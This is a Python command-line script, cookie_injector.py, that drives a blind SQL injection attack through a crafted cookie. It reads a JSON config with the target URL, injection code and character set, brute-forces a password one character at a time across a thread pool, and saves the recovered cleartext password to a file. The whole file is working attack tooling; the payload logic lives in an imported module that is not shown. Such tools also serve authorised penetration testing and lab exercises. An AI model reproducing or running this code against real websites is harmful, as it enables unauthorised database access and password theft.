#!/usr/bin/env python3.12
# cookie_injector.py

import datetime
import json
import sys
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor

import click
from rich.console import Console
from rich.markdown import Markdown

from SQLInjector.injector import Injector


class StartInjector:
    def __init__(self, set_url, config_file_path, out_file, setup_utility):
        self.c = Console()
        self.futures = []
        self.future = None
        self.start_time = None
        self.set_url = set_url
        self.config_file_path = config_file_path
        self.out_file = out_file
        self.setup_utility = setup_utility
        self.config = dict()
        self.injector = None
        self.setup = None

    def load_config(self) -> dict:
        try:
            with open(self.config_file_path, "r") as config_file:
                return dict(json.load(config_file))
        except FileNotFoundError:
            self.run_cookie_injector_setup()
            with open(self.config_file_path, "r") as config_file:
                return dict(json.load(config_file))

    def initialize_data(self) -> tuple:
        target_url = self.config.get("target_url")
        confirm_string = self.config.get("confirm_string").encode()
        cookie_name = self.config.get("cookie_name")
        passwd_length = int(self.config.get("passwd_length"))
        char_set = self.config.get("char_set")
        inject_code = self.config.get("inject_code")
        max_threads = int(self.config.get("max_threads"))
        return target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads

    def print_config_file(self) -> None:
        config_file_content = self.load_config()
        print()
        if not self.set_url:
            self.c.print(Markdown(f"**Using data from configuration file...**"))
            print()
        self.c.print(Markdown(f"# Configuration File Content"))
        self.c.print(config_file_content, style="black")

    def run_cookie_injector_setup(self) -> None:
        from SQLInjector import cookie_injector_setup
        self.setup = cookie_injector_setup.main
        self.setup()

    def thread_pool_executor(self, max_threads: int, passwd_length: int) -> None:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            for thread_id, working_queue in enumerate(self.injector.queues):
                if self.future is not None:
                    if self.future.cancelled():
                        self.kill_all_threads()
                while not working_queue.empty():
                    if len(self.injector.discard_seq_num) < passwd_length:
                        payload = working_queue.get()
                        self.future = executor.submit(
                            self.injector.cookie_injector,
                            payload.inject_code,
                            payload.sequence_num,
                            payload.character,
                            self.start_time
                        )
                        self.futures.append(self.future)
                    else:
                        self.kill_all_threads()

    def process_char_dict(self) -> str:
        found_characters = self.injector.found_characters
        ordered_passwd_dict = OrderedDict(sorted(found_characters.items(), key=lambda item: int(item[0].split()[1])))
        clear_text_passwd = ""
        for k, v in ordered_passwd_dict.items():
            clear_text_passwd += str(v)
        return clear_text_passwd

    def passwd_was_found(self, clear_text_passwd):
        message = f"Password successfully brute forced: {clear_text_passwd}"
        self.c.print(message, style="green")
        if self.out_file:
            with open(self.out_file, "w", encoding="utf-8") as output_file:
                output_file.write(message + "\n")
            self.c.print(f"Output file '{self.out_file}' created successfully.")

    def passwd_was_not_found(self):
        message = f"No password recovered."
        self.c.print(message, style="red")
        if self.out_file:
            with open(self.out_file, "w", encoding="utf-8") as output_file:
                output_file.write(message + "\n")
            self.c.print(f"Output file '{self.out_file}' created successfully.")

    def process_execution_time(self):
        end_time = datetime.datetime.now()
        run_time = end_time - self.start_time
        return run_time, end_time

    def process_passwd_data(self) -> None:
        clear_text_passwd = self.process_char_dict()
        run_time, end_time = self.process_execution_time()
        if len(clear_text_passwd) >= 1:
            self.passwd_was_found(clear_text_passwd)
        else:
            self.passwd_was_not_found()
        self.c.print(f"Completed in {run_time} seconds at {end_time}.", style="blue")

    def process_options(self):
        if self.setup_utility:
            self.run_cookie_injector_setup()
        self.config = self.load_config()
        if self.set_url:
            self.config["target_url"] = self.set_url
            print()
            self.c.print(Markdown(f"\n**Using custom URL...**\n- Target URL: {self.config.get("target_url")}"))
        return self.initialize_data()

    def kill_all_threads(self):
        for future in self.futures:
            future.cancel()
        for future in self.futures:
            try:
                future.result()
            except Exception as e:
                pass
        self.futures = []

    def start_threads(self):
        try:
            target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads = (
                self.process_options()
            )
            self.print_config_file()
            self.injector = Injector(
                target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads
            )
            self.start_time = datetime.datetime.now()
            self.c.print(f"Start time {self.start_time}.", style="blue")
            self.injector.check_url()
            self.injector.brute_forcer()
            self.c.print(Markdown("# Brute forcing password..."))
            self.thread_pool_executor(max_threads, passwd_length)
            self.process_passwd_data()
        except KeyboardInterrupt:
            self.kill_all_threads()
            sys.exit("\n\nExiting, please wait.\n\nBye.\n")


@click.command(
    help="This app injects a cookie, sends the crafted request, "
         "and checks the response from the page content.\n"
         "It needs a JSON configuration file. You can edit this manually, "
         "at the path: 'config/cookie_injector.json'. The setup utility will "
         "run automatically, to create one, when launching cookie_injector.py "
         "without a configuration file in the config folder. Alternatively you "
         "can run it with the '-s' option."
)
@click.option(
    "-u", "--set-url", "set_url",
    help="Specify target URL instead of the one in config file.",
    required=False,
    type=str
)
@click.option(
    "-s", "--setup-utility", "setup_utility",
    help="Interactively edit the config file.",
    is_flag=True,
    required=False,
    default=False,
)
@click.option(
    "-f", "--config-file", "config_file_path",
    help="Path to config file.",
    default="config/cookie_injector.json",
    show_default=True,
    type=click.Path(exists=False),
    required=True
)
@click.option(
    "-o", "--out-file", "out_file",
    help="Path to output file with the recovered password.",
    type=click.Path(exists=False),
    required=False
)
def main(set_url, config_file_path, out_file, setup_utility):
    injector_starter = StartInjector(set_url, config_file_path, out_file, setup_utility)
    injector_starter.start_threads()


if __name__ == '__main__':
    main()
